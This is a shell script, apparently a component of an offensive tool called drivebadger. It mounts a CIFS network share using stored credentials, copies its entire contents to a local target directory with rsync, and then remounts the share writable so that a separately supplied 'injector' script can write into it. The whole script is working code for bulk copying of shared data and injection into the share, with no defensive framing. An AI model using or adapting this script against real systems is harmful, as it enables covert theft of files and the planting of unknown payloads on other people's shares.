#!/bin/sh

line=$1
basedir=$2
target_root_directory=$3

WHAT=`echo "$line" |awk '{ print $1 }'`
cifsopt=`echo "$line" |awk '{ print $4 }' |sed -e s/rw,/ro,/g -e s/hard/soft/g -e "s#credentials=#credentials=$basedir#g"`
cifshost=`echo $WHAT |cut -d'/' -f3`
sharename=`echo $WHAT |cut -d'/' -f4- |tr -d '$' |tr '/' '_'`
mountpoint=/media/$cifshost-$sharename/mnt
subtarget=$target_root_directory/$cifshost-cifs/$sharename
mkdir -p $mountpoint $subtarget

if mount -t cifs -o ro,soft,$cifsopt "$WHAT" $mountpoint >>$subtarget/rsync.log 2>>$subtarget/rsync.err; then
	logger "copying CIFS=$WHAT (mounted as $mountpoint, target directory $subtarget)"
	/opt/drivebadger/internal/generic/rsync-partition.sh $mountpoint $subtarget >>$subtarget/rsync.log 2>>$subtarget/rsync.err
	umount $mountpoint
	logger "copied CIFS=$WHAT"
fi


injector=`/opt/drivebadger/internal/generic/get-injector-script.sh cifs`

if [ "$injector" != "" ]; then
	logger "attempting to inject CIFS=$WHAT (mounted as $mountpoint, injector $injector)"
	if mount -t cifs -o rw,soft,$cifsopt "$WHAT" $mountpoint >>$subtarget/injector.log 2>>$subtarget/injector.err; then
		$injector $mountpoint >>$subtarget/injector.log 2>>$subtarget/injector.err
		umount $mountpoint
		logger "injected CIFS=$WHAT"
	fi
fi
